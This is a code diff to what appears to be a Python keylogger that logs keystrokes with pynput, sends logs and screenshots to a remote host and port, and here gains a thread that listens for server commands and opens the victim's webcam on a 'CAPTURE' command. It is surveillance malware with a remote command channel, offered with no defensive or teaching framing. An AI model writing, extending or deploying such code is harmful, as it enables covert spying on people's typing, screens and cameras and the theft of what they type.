@@ -1,4 +1,5 @@
-import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui
+import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui, threading, cv2
+
 from pynput.keyboard import Key, Listener
 
 
@@ -73,6 +74,38 @@ def take_screenshot(host, port):
         print('Server unreachable ! The screenshot will be sent later')
 
 
+# Function to open the webcam
+def open_webcam():
+    cv2.namedWindow("preview")
+    vc = cv2.VideoCapture(0)
+
+    if vc.isOpened():
+        rval, frame = vc.read()
+    else:
+        rval = False
+
+    while rval:
+        cv2.imshow("preview", frame)
+        rval, frame = vc.read()
+        key = cv2.waitKey(20)
+        if key == 27 or cv2.getWindowProperty('preview', cv2.WND_PROP_VISIBLE) < 1:
+            break
+
+    vc.release()
+    cv2.destroyWindow("preview")
+
+
+def receive_server_commands(host, port):
+    with socket.create_connection((host, port)) as client_socket:
+        while True:
+            try:
+                command = client_socket.recv(1024).decode()
+                if command == 'CAPTURE':
+                    open_webcam()
+            except socket.error:
+                print('Error receiving command from server')
+
+
 # Function to start the listener
 def start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time):
     with Listener(on_press=listen_keyboard) as listener:
@@ -100,6 +133,8 @@ def main():
     capture_duration = 600
     start_time = time.time()
     delay_send_log = 10
+
+    threading.Thread(target=receive_server_commands, args=(host, port)).start()
     start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time)
 
 
